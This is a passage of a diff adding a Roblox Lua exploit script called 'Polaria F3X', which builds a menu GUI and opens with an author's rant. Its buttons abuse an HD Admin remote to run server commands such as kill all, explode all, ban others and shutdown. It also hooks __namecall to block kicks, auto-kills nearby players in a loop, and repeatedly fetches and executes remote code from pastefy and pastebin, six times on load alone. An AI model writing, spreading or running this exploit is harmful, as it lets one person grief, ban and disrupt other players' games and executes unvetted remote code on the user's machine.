@@ -1,0 +1,5220 @@
+--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--
+
+
+--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--
+
+
+--[ Make sure your device is not a potato to run the maps properly ]--
+
+--[ Printing (Very useless)]--
+
+loadstring(game:HttpGet("https://pastefy.app/F9c8Jrbt/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/F9c8Jrbt/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/F9c8Jrbt/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/F9c8Jrbt/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/F9c8Jrbt/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/F9c8Jrbt/raw"))()
+
+--[ Gui converted by Gui to Lua plugin ]--
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local main = Instance.new("ScreenGui")
+local icon = Instance.new("Frame")
+local top = Instance.new("Frame")
+local title = Instance.new("TextLabel")
+local close = Instance.new("TextButton")
+local maximize = Instance.new("TextButton")
+local minimize = Instance.new("TextButton")
+local Holder = Instance.new("Frame")
+local Home = Instance.new("TextButton")
+local Server = Instance.new("TextButton")
+local Scripts = Instance.new("TextButton")
+local serverpage = Instance.new("Frame")
+local UnAnchor = Instance.new("TextButton")
+local c00lkidd = Instance.new("TextButton")
+local BasePlate = Instance.new("TextButton")
+local KillAll = Instance.new("TextButton")
+local ClearTerrain = Instance.new("TextButton")
+local Disco = Instance.new("TextButton")
+local Anti = Instance.new("TextButton")
+local rain = Instance.new("TextButton")
+local lego = Instance.new("TextButton")
+local r6 = Instance.new("TextButton")
+local workspace = Instance.new("TextButton")
+local _63x = Instance.new("TextButton")
+local tornado = Instance.new("TextButton")
+local shutdown = Instance.new("TextButton")
+local nokick = Instance.new("TextButton")
+local song = Instance.new("TextButton")
+local destroy = Instance.new("TextButton")
+local ban = Instance.new("TextButton")
+local flood = Instance.new("TextButton")
+local explode = Instance.new("TextButton")
+local fog = Instance.new("TextButton")
+local heli = Instance.new("TextButton")
+local invis = Instance.new("TextButton")
+local smok = Instance.new("TextButton")
+local pe = Instance.new("TextButton")
+local fling = Instance.new("TextButton")
+local scriptspage = Instance.new("Frame")
+local ssp = Instance.new("TextButton")
+local nzi = Instance.new("TextButton")
+local hax1 = Instance.new("TextButton")
+local hax2 = Instance.new("TextButton")
+local ship = Instance.new("TextButton")
+local noot = Instance.new("TextButton")
+local sledoni = Instance.new("TextButton")
+local sledoniyong = Instance.new("TextButton")
+local grand = Instance.new("TextButton")
+local exca = Instance.new("TextButton")
+local r6_2 = Instance.new("TextButton")
+local primadon = Instance.new("TextButton")
+local topkek = Instance.new("TextButton")
+local subspace = Instance.new("TextButton")
+local bom2 = Instance.new("TextButton")
+local pistol = Instance.new("TextButton")
+local topkek5 = Instance.new("TextButton")
+local mosque = Instance.new("TextButton")
+local MLG = Instance.new("TextButton")
+local hung = Instance.new("TextButton")
+local trshhyub = Instance.new("TextButton")
+local gkv1 = Instance.new("TextButton")
+local uzi = Instance.new("TextButton")
+local guns = Instance.new("TextButton")
+local stra = Instance.new("TextButton")
+local k0p = Instance.new("TextButton")
+local infiniteyield = Instance.new("TextButton")
+local exser = Instance.new("TextButton")
+local nextpage = Instance.new("TextButton")
+local Executor = Instance.new("TextButton")
+local executorpage = Instance.new("Frame")
+local input = Instance.new("TextBox")
+local exec = Instance.new("TextButton")
+local clear = Instance.new("TextButton")
+local hey = Instance.new("TextLabel")
+local idk = Instance.new("TextLabel")
+local Output = Instance.new("TextButton")
+local outputpage = Instance.new("Frame")
+local MainComponent = Instance.new("ScrollingFrame")
+local output = Instance.new("TextBox")
+local clear_2 = Instance.new("TextButton")
+local homepage = Instance.new("Frame")
+local br = Instance.new("TextLabel")
+local user = Instance.new("TextLabel")
+local br2 = Instance.new("TextLabel")
+local age = Instance.new("TextLabel")
+local br3 = Instance.new("TextLabel")
+local f = Instance.new("TextLabel")
+local user_2 = Instance.new("ImageLabel")
+local svrtime = Instance.new("TextLabel")
+local realtime = Instance.new("TextLabel")
+local jobid = Instance.new("TextLabel")
+local placeid = Instance.new("TextLabel")
+local idk_2 = Instance.new("TextLabel")
+local progress = Instance.new("TextLabel")
+local scriptspage3 = Instance.new("Frame")
+local beforepage = Instance.new("TextButton")
+local nextpage_2 = Instance.new("TextButton")
+local scriptspage2 = Instance.new("Frame")
+local omni = Instance.new("TextButton")
+local destructiong = Instance.new("TextButton")
+local beforepage_2 = Instance.new("TextButton")
+local IDE = Instance.new("TextButton")
+local mystic = Instance.new("TextButton")
+local dog = Instance.new("TextButton")
+local mosque_3 = Instance.new("TextButton")
+local ssp2 = Instance.new("TextButton")
+local laser = Instance.new("TextButton")
+local china = Instance.new("TextButton")
+local bean = Instance.new("TextButton")
+local patrik = Instance.new("TextButton")
+local kitchen = Instance.new("TextButton")
+local virus = Instance.new("TextButton")
+local rocky = Instance.new("TextButton")
+local yield = Instance.new("TextButton")
+local cina = Instance.new("TextButton")
+local mc = Instance.new("TextButton")
+local c4 = Instance.new("TextButton")
+local summon = Instance.new("TextButton")
+local bv = Instance.new("TextButton")
+local ploit = Instance.new("TextButton")
+local hamer = Instance.new("TextButton")
+local baby = Instance.new("TextButton")
+local kik = Instance.new("TextButton")
+local c0l = Instance.new("TextButton")
+local nds = Instance.new("TextButton")
+local cart = Instance.new("TextButton")
+local GK = Instance.new("TextButton")
+local nextpage_3 = Instance.new("TextButton")
+local ambientShadow = Instance.new("ImageLabel")
+local penumbraShadow = Instance.new("ImageLabel")
+local umbraShadow = Instance.new("ImageLabel")
+local UIDragdetector = Instance.new("UIDragDetector")
+
+--Properties:
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+main.Name = "main"
+main.Parent = game.CoreGui
+main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+main.ResetOnSpawn = false
+
+top.Name = "top"
+top.Parent = main
+top.Active = true
+top.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+top.BorderColor3 = Color3.fromRGB(129, 26, 255)
+top.BorderSizePixel = 2
+top.Position = UDim2.new(0.325987846, 0, 0.334872991, 0)
+top.Size = UDim2.new(0, 457, 0, 29)
+top.ZIndex = 0
+
+UIDragdetector.Parent = top
+
+title.Name = "title"
+title.Parent = top
+title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1.000
+title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+title.BorderSizePixel = 0
+title.Position = UDim2.new(0.0153172864, 0, 0, 0)
+title.Size = UDim2.new(0, 187, 0, 29)
+title.Font = Enum.Font.Nunito
+title.Text = "POLARIA"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 19.000
+title.TextWrapped = true
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+close.Name = "close"
+close.Parent = top
+close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+close.BorderColor3 = Color3.fromRGB(129, 26, 255)
+close.BorderSizePixel = 2
+close.Position = UDim2.new(0.93654269, 0, 0, 0)
+close.Size = UDim2.new(0, 29, 0, 29)
+close.Font = Enum.Font.Arial
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(255, 255, 255)
+close.TextSize = 23.000
+close.TextWrapped = true
+close.MouseButton1Click:Connect(function()
+	main:Destroy()
+end)
+
+maximize.Name = "maximize"
+maximize.Parent = top
+maximize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+maximize.BorderColor3 = Color3.fromRGB(129, 26, 255)
+maximize.BorderSizePixel = 2
+maximize.Position = UDim2.new(0.87308532, 0, 0, 0)
+maximize.Size = UDim2.new(0, 29, 0, 29)
+maximize.Font = Enum.Font.Arial
+maximize.Text = "🗖"
+maximize.TextColor3 = Color3.fromRGB(255, 255, 255)
+maximize.TextSize = 23.000
+maximize.TextWrapped = true
+
+minimize.Name = "minimize"
+minimize.Parent = top
+minimize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+minimize.BorderColor3 = Color3.fromRGB(129, 26, 255)
+minimize.BorderSizePixel = 2
+minimize.Position = UDim2.new(0.80962801, 0, 0, 0)
+minimize.Size = UDim2.new(0, 29, 0, 29)
+minimize.Font = Enum.Font.Arial
+minimize.Text = "-"
+minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimize.TextSize = 37.000
+minimize.TextWrapped = true
+
+Holder.Name = "Holder"
+Holder.Parent = top
+Holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Holder.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Holder.BorderSizePixel = 2
+Holder.Position = UDim2.new(0, 0, 1, 0)
+Holder.Size = UDim2.new(0, 457, 0, 311)
+
+Home.Name = "Home"
+Home.Parent = Holder
+Home.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Home.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Home.BorderSizePixel = 2
+Home.Size = UDim2.new(0, 107, 0, 29)
+Home.Font = Enum.Font.Arial
+Home.Text = "Home"
+Home.TextColor3 = Color3.fromRGB(255, 255, 255)
+Home.TextSize = 18.000
+Home.TextWrapped = true
+
+Server.Name = "Server"
+Server.Parent = Holder
+Server.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Server.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Server.BorderSizePixel = 2
+Server.Position = UDim2.new(0.234135672, 0, 0, 0)
+Server.Size = UDim2.new(0, 103, 0, 29)
+Server.Font = Enum.Font.Arial
+Server.Text = "Server\\Local"
+Server.TextColor3 = Color3.fromRGB(255, 255, 255)
+Server.TextSize = 18.000
+Server.TextWrapped = true
+
+Scripts.Name = "Scripts"
+Scripts.Parent = Holder
+Scripts.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Scripts.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Scripts.BorderSizePixel = 2
+Scripts.Position = UDim2.new(0.459518611, 0, 0, 0)
+Scripts.Size = UDim2.new(0, 89, 0, 29)
+Scripts.Font = Enum.Font.Arial
+Scripts.Text = "Scripts"
+Scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts.TextSize = 18.000
+Scripts.TextWrapped = true
+
+serverpage.Name = "serverpage"
+serverpage.Parent = Holder
+serverpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+serverpage.BackgroundTransparency = 1.000
+serverpage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+serverpage.BorderSizePixel = 0
+serverpage.Position = UDim2.new(0, 0, 0.0996784568, 0)
+serverpage.Size = UDim2.new(0, 457, 0, 280)
+serverpage.Visible = false
+
+UnAnchor.Name = "UnAnchor"
+UnAnchor.Parent = serverpage
+UnAnchor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+UnAnchor.BorderColor3 = Color3.fromRGB(129, 26, 255)
+UnAnchor.BorderSizePixel = 2
+UnAnchor.Position = UDim2.new(0.0306345727, 0, 0.0357142873, 0)
+UnAnchor.Size = UDim2.new(0, 104, 0, 29)
+UnAnchor.Font = Enum.Font.Arial
+UnAnchor.Text = "UnAnchor"
+UnAnchor.TextColor3 = Color3.fromRGB(255, 255, 255)
+UnAnchor.TextSize = 18.000
+UnAnchor.TextWrapped = true
+UnAnchor.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet('https://pastebin.com/raw/nLdnURwp',true))()
+end)
+
+c00lkidd.Name = "c00lkidd"
+c00lkidd.Parent = serverpage
+c00lkidd.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+c00lkidd.BorderColor3 = Color3.fromRGB(129, 26, 255)
+c00lkidd.BorderSizePixel = 2
+c00lkidd.Position = UDim2.new(0.271334797, 0, 0.0357142873, 0)
+c00lkidd.Size = UDim2.new(0, 104, 0, 29)
+c00lkidd.Font = Enum.Font.Arial
+c00lkidd.Text = "C00LKIDD"
+c00lkidd.TextColor3 = Color3.fromRGB(255, 255, 255)
+c00lkidd.TextSize = 18.000
+c00lkidd.TextWrapped = true
+c00lkidd.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/cWGor0lN/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/eiKaOEdA/raw"))()
+rq:InvokeServer(";sh C00L KIDD STUFFS ON YOU LOLL!!!!!!! TEAM C00LKIDD JOIN TODAY!")
+loadstring(game:HttpGet('https://pastebin.com/raw/nLdnURwp',true))()
+end)
+
+BasePlate.Name = "BasePlate"
+BasePlate.Parent = serverpage
+BasePlate.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BasePlate.BorderColor3 = Color3.fromRGB(129, 26, 255)
+BasePlate.BorderSizePixel = 2
+BasePlate.Position = UDim2.new(0.512035012, 0, 0.0357142873, 0)
+BasePlate.Size = UDim2.new(0, 104, 0, 29)
+BasePlate.Font = Enum.Font.Arial
+BasePlate.Text = "Baseplate"
+BasePlate.TextColor3 = Color3.fromRGB(255, 255, 255)
+BasePlate.TextSize = 18.000
+BasePlate.TextWrapped = true
+BasePlate.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/KetAzudW"))()
+end)
+
+KillAll.Name = "Kill All"
+KillAll.Parent = serverpage
+KillAll.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+KillAll.BorderColor3 = Color3.fromRGB(129, 26, 255)
+KillAll.BorderSizePixel = 2
+KillAll.Position = UDim2.new(0.752735257, 0, 0.0357142873, 0)
+KillAll.Size = UDim2.new(0, 99, 0, 29)
+KillAll.Font = Enum.Font.Arial
+KillAll.Text = "Kill All"
+KillAll.TextColor3 = Color3.fromRGB(255, 255, 255)
+KillAll.TextSize = 18.000
+KillAll.TextWrapped = true
+KillAll.MouseButton1Click:Connect(function()
+rq:InvokeServer(";kill all")
+end)
+
+ClearTerrain.Name = "Clear Terrain"
+ClearTerrain.Parent = serverpage
+ClearTerrain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ClearTerrain.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ClearTerrain.BorderSizePixel = 2
+ClearTerrain.Position = UDim2.new(0.0306345727, 0, 0.160714284, 0)
+ClearTerrain.Size = UDim2.new(0, 104, 0, 29)
+ClearTerrain.Font = Enum.Font.Arial
+ClearTerrain.Text = "Clear Terrain"
+ClearTerrain.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearTerrain.TextSize = 18.000
+ClearTerrain.TextWrapped = true
+ClearTerrain.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
+end)
+
+Disco.Name = "Disco"
+Disco.Parent = serverpage
+Disco.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Disco.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Disco.BorderSizePixel = 2
+Disco.Position = UDim2.new(0.271334797, 0, 0.160714284, 0)
+Disco.Size = UDim2.new(0, 104, 0, 29)
+Disco.Font = Enum.Font.Arial
+Disco.Text = "Disco"
+Disco.TextColor3 = Color3.fromRGB(255, 255, 255)
+Disco.TextSize = 18.000
+Disco.TextWrapped = true
+Disco.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/Xt7oQTrX/raw"))()
+end)
+
+Anti.Name = "Anti"
+Anti.Parent = serverpage
+Anti.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Anti.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Anti.BorderSizePixel = 2
+Anti.Position = UDim2.new(0.512035012, 0, 0.160714284, 0)
+Anti.Size = UDim2.new(0, 104, 0, 29)
+Anti.Font = Enum.Font.Arial
+Anti.Text = "Anti-Robloxian"
+Anti.TextColor3 = Color3.fromRGB(255, 255, 255)
+Anti.TextSize = 18.000
+Anti.TextWrapped = true
+Anti.MouseButton1Click:Connect(function()
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local KillDistance = 17
+local KilledAlready = {}
+
+
+local function KillPlayer(player)
+	if not KilledAlready[player] then
+		KilledAlready[player] = true
+		rq:InvokeServer(";kill " .. player.Name)
+	end
+end
+
+
+local function CheckDistance()
+	local myChar = LocalPlayer.Character
+	if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end
+
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+			local dist = (myChar.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+			if dist <= KillDistance then
+				KillPlayer(player)
+			end
+		else
+			KilledAlready[player] = nil 
+		end
+	end
+end
+
+
+RunService.RenderStepped:Connect(CheckDistance)
+
+end)
+
+rain.Name = "rain"
+rain.Parent = serverpage
+rain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+rain.BorderColor3 = Color3.fromRGB(129, 26, 255)
+rain.BorderSizePixel = 2
+rain.Position = UDim2.new(0.752735257, 0, 0.160714284, 0)
+rain.Size = UDim2.new(0, 99, 0, 29)
+rain.Font = Enum.Font.Arial
+rain.Text = "Taco rain"
+rain.TextColor3 = Color3.fromRGB(255, 255, 255)
+rain.TextSize = 18.000
+rain.TextWrapped = true
+rain.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/Y268tPI3/raw"))()
+end)
+
+lego.Name = "lego"
+lego.Parent = serverpage
+lego.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+lego.BorderColor3 = Color3.fromRGB(129, 26, 255)
+lego.BorderSizePixel = 2
+lego.Position = UDim2.new(0.752735257, 0, 0.285714298, 0)
+lego.Size = UDim2.new(0, 99, 0, 29)
+lego.Font = Enum.Font.Arial
+lego.Text = "Bricks"
+lego.TextColor3 = Color3.fromRGB(255, 255, 255)
+lego.TextSize = 18.000
+lego.TextWrapped = true
+lego.MouseButton1Click:Connect(function()
+rq:InvokeServer(";insert 65523893")
+wait(0.1)
+rq:InvokeServer(";insert 65524063")
+wait(0.1)
+rq:InvokeServer(";insert 65523935")
+wait(0.1)
+rq:InvokeServer(";insert 65523983")
+wait(1)
+rq:InvokeServer(";insert 65523893")
+wait(0.1)
+rq:InvokeServer(";insert 65524063")
+wait(0.1)
+rq:InvokeServer(";insert 65523935")
+wait(0.1)
+rq:InvokeServer(";insert 65523983")
+end)
+
+r6.Name = "r6"
+r6.Parent = serverpage
+r6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+r6.BorderColor3 = Color3.fromRGB(129, 26, 255)
+r6.BorderSizePixel = 2
+r6.Position = UDim2.new(0.512035012, 0, 0.285714298, 0)
+r6.Size = UDim2.new(0, 104, 0, 29)
+r6.Font = Enum.Font.Arial
+r6.Text = "R6"
+r6.TextColor3 = Color3.fromRGB(255, 255, 255)
+r6.TextSize = 18.000
+r6.TextWrapped = true
+r6.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r6")
+end)
+
+workspace.Name = "workspace"
+workspace.Parent = serverpage
+workspace.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+workspace.BorderColor3 = Color3.fromRGB(129, 26, 255)
+workspace.BorderSizePixel = 2
+workspace.Position = UDim2.new(0.271334797, 0, 0.285714298, 0)
+workspace.Size = UDim2.new(0, 104, 0, 29)
+workspace.Font = Enum.Font.Arial
+workspace.Text = "Clear Workspace"
+workspace.TextColor3 = Color3.fromRGB(255, 255, 255)
+workspace.TextSize = 12.000
+workspace.TextWrapped = true
+workspace.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
+end)
+
+_63x.Name = "6 3x"
+_63x.Parent = serverpage
+_63x.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+_63x.BorderColor3 = Color3.fromRGB(129, 26, 255)
+_63x.BorderSizePixel = 2
+_63x.Position = UDim2.new(0.0306345727, 0, 0.285714298, 0)
+_63x.Size = UDim2.new(0, 104, 0, 29)
+_63x.Font = Enum.Font.Arial
+_63x.Text = "666"
+_63x.TextColor3 = Color3.fromRGB(255, 255, 255)
+_63x.TextSize = 18.000
+_63x.TextWrapped = true
+_63x.MouseButton1Click:Connect(function()
+rq:InvokeServer(";titler all 666 666 666 666")
+loadstring(game:HttpGet("https://pastefy.app/8D0KpDjn/raw"))()
+end)
+
+tornado.Name = "tornado"
+tornado.Parent = serverpage
+tornado.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+tornado.BorderColor3 = Color3.fromRGB(129, 26, 255)
+tornado.BorderSizePixel = 2
+tornado.Position = UDim2.new(0.752735257, 0, 0.414285719, 0)
+tornado.Size = UDim2.new(0, 99, 0, 29)
+tornado.Font = Enum.Font.Arial
+tornado.Text = "Tornado"
+tornado.TextColor3 = Color3.fromRGB(255, 255, 255)
+tornado.TextSize = 18.000
+tornado.TextWrapped = true
+tornado.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/KzS5FG2N/raw"))()
+end)
+
+shutdown.Name = "shutdown"
+shutdown.Parent = serverpage
+shutdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shutdown.BorderColor3 = Color3.fromRGB(129, 26, 255)
+shutdown.BorderSizePixel = 2
+shutdown.Position = UDim2.new(0.512035012, 0, 0.414285719, 0)
+shutdown.Size = UDim2.new(0, 104, 0, 29)
+shutdown.Font = Enum.Font.Arial
+shutdown.Text = "Shutdown"
+shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
+shutdown.TextSize = 18.000
+shutdown.TextWrapped = true
+shutdown.MouseButton1Click:Connect(function()
+rq:InvokeServer(";shutdown")
+end)
+
+nokick.Name = "no kick"
+nokick.Parent = serverpage
+nokick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+nokick.BorderColor3 = Color3.fromRGB(129, 26, 255)
+nokick.BorderSizePixel = 2
+nokick.Position = UDim2.new(0.271334797, 0, 0.414285719, 0)
+nokick.Size = UDim2.new(0, 104, 0, 29)
+nokick.Font = Enum.Font.Arial
+nokick.Text = "Anti Kick"
+nokick.TextColor3 = Color3.fromRGB(255, 255, 255)
+nokick.TextSize = 18.000
+nokick.TextWrapped = true
+nokick.MouseButton1Click:Connect(function()
+local old
+old = hookmetamethod(
+    game,
+    "__namecall",
+    function(self, ...)
+        local method = tostring(getnamecallmethod())
+        if string.lower(method) == "kick" then
+            return wait(9e9)
+        end
+        return old(self, ...)
+    end)
+end)
+
+song.Name = "song"
+song.Parent = serverpage
+song.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+song.BorderColor3 = Color3.fromRGB(129, 26, 255)
+song.BorderSizePixel = 2
+song.Position = UDim2.new(0.271334797, 0, 0.414285719, 0)
+song.Size = UDim2.new(0, 104, 0, 29)
+song.Font = Enum.Font.Arial
+song.Text = "Play theme"
+song.TextColor3 = Color3.fromRGB(255, 255, 255)
+song.TextSize = 18.000
+song.TextWrapped = true
+
+destroy.Name = "destroy"
+destroy.Parent = serverpage
+destroy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+destroy.BorderColor3 = Color3.fromRGB(129, 26, 255)
+destroy.BorderSizePixel = 2
+destroy.Position = UDim2.new(0.0306345727, 0, 0.539285719, 0)
+destroy.Size = UDim2.new(0, 104, 0, 29)
+destroy.Font = Enum.Font.Arial
+destroy.Text = "Destruction"
+destroy.TextColor3 = Color3.fromRGB(255, 255, 255)
+destroy.TextSize = 18.000
+destroy.TextWrapped = true
+destroy.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
+end)
+
+ban.Name = "ban"
+ban.Parent = serverpage
+ban.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ban.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ban.BorderSizePixel = 2
+ban.Position = UDim2.new(0.0306345727, 0, 0.414285719, 0)
+ban.Size = UDim2.new(0, 104, 0, 29)
+ban.Font = Enum.Font.Arial
+ban.Text = "Ban others"
+ban.TextColor3 = Color3.fromRGB(255, 255, 255)
+ban.TextSize = 18.000
+ban.TextWrapped = true
+ban.MouseButton1Click:Connect(function()
+rq:InvokeServer(";kick others You have been banned from this server.")
+rq:InvokeServer(";ban others")
+end)
+
+flood.Name = "flood"
+flood.Parent = serverpage
+flood.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+flood.BorderColor3 = Color3.fromRGB(129, 26, 255)
+flood.BorderSizePixel = 2
+flood.Position = UDim2.new(0.271334797, 0, 0.539285719, 0)
+flood.Size = UDim2.new(0, 104, 0, 29)
+flood.Font = Enum.Font.Arial
+flood.Text = "Flood"
+flood.TextColor3 = Color3.fromRGB(255, 255, 255)
+flood.TextSize = 18.000
+flood.TextWrapped = true
+flood.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/FJTKrCdo/raw"))()
+end)
+
+explode.Name = "explode"
+explode.Parent = serverpage
+explode.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+explode.BorderColor3 = Color3.fromRGB(129, 26, 255)
+explode.BorderSizePixel = 2
+explode.Position = UDim2.new(0.512035012, 0, 0.539285719, 0)
+explode.Size = UDim2.new(0, 104, 0, 29)
+explode.Font = Enum.Font.Arial
+explode.Text = "Explode All"
+explode.TextColor3 = Color3.fromRGB(255, 255, 255)
+explode.TextSize = 18.000
+explode.TextWrapped = true
+explode.MouseButton1Click:Connect(function()
+rq:InvokeServer(";explode all")
+end)
+
+fog.Name = "fog"
+fog.Parent = serverpage
+fog.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+fog.BorderColor3 = Color3.fromRGB(129, 26, 255)
+fog.BorderSizePixel = 2
+fog.Position = UDim2.new(0.752735257, 0, 0.539285719, 0)
+fog.Size = UDim2.new(0, 99, 0, 29)
+fog.Font = Enum.Font.Arial
+fog.Text = "Nightmare"
+fog.TextColor3 = Color3.fromRGB(255, 255, 255)
+fog.TextSize = 18.000
+fog.TextWrapped = true
+fog.MouseButton1Click:Connect(function()
+rq:InvokeServer(";fogcolor black ;fog 100 100")
+end)
+
+heli.Name = "heli"
+heli.Parent = serverpage
+heli.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+heli.BorderColor3 = Color3.fromRGB(129, 26, 255)
+heli.BorderSizePixel = 2
+heli.Position = UDim2.new(0.0306345727, 0, 0.664285719, 0)
+heli.Size = UDim2.new(0, 104, 0, 29)
+heli.Font = Enum.Font.Arial
+heli.Text = "Helicopter"
+heli.TextColor3 = Color3.fromRGB(255, 255, 255)
+heli.TextScaled = true
+heli.TextSize = 18.000
+heli.TextWrapped = true
+heli.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/64nPHa0K/raw"))()
+end)
+
+invis.Name = "invis"
+invis.Parent = serverpage
+invis.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+invis.BorderColor3 = Color3.fromRGB(129, 26, 255)
+invis.BorderSizePixel = 2
+invis.Position = UDim2.new(0.271334797, 0, 0.664285719, 0)
+invis.Size = UDim2.new(0, 104, 0, 29)
+invis.Font = Enum.Font.Arial
+invis.Text = "Invisible All"
+invis.TextColor3 = Color3.fromRGB(255, 255, 255)
+invis.TextSize = 18.000
+invis.TextWrapped = true
+invis.MouseButton1Click:Connect(function()
+rq:InvokeServer(";invisible all")
+end)
+
+smok.Name = "smok"
+smok.Parent = serverpage
+smok.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+smok.BorderColor3 = Color3.fromRGB(129, 26, 255)
+smok.BorderSizePixel = 2
+smok.Position = UDim2.new(0.512035012, 0, 0.664285719, 0)
+smok.Size = UDim2.new(0, 104, 0, 29)
+smok.Font = Enum.Font.Arial
+smok.Text = "Smoke All"
+smok.TextColor3 = Color3.fromRGB(255, 255, 255)
+smok.TextSize = 18.000
+smok.TextWrapped = true
+smok.MouseButton1Click:Connect(function()
+rq:InvokeServer(";smoke all")
+end)
+
+pe.Name = "pe"
+pe.Parent = serverpage
+pe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+pe.BorderColor3 = Color3.fromRGB(129, 26, 255)
+pe.BorderSizePixel = 2
+pe.Position = UDim2.new(0.752735257, 0, 0.664285719, 0)
+pe.Size = UDim2.new(0, 99, 0, 29)
+pe.Font = Enum.Font.Arial
+pe.Text = "Fire all"
+pe.TextColor3 = Color3.fromRGB(255, 255, 255)
+pe.TextScaled = true
+pe.TextSize = 18.000
+pe.TextWrapped = true
+pe.MouseButton1Click:Connect(function()
+rq:InvokeServer(";fire all")
+end)
+
+fling.Name = "fling"
+fling.Parent = serverpage
+fling.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+fling.BorderColor3 = Color3.fromRGB(129, 26, 255)
+fling.BorderSizePixel = 2
+fling.Position = UDim2.new(0.0306345727, 0, 0.789285719, 0)
+fling.Size = UDim2.new(0, 104, 0, 29)
+fling.Font = Enum.Font.Arial
+fling.Text = "Fling All"
+fling.TextColor3 = Color3.fromRGB(255, 255, 255)
+fling.TextScaled = true
+fling.TextSize = 18.000
+fling.TextWrapped = true
+fling.MouseButton1Click:Connect(function()
+rq:InvokeServer(";fling all")
+end)
+
+scriptspage.Name = "scriptspage"
+scriptspage.Parent = Holder
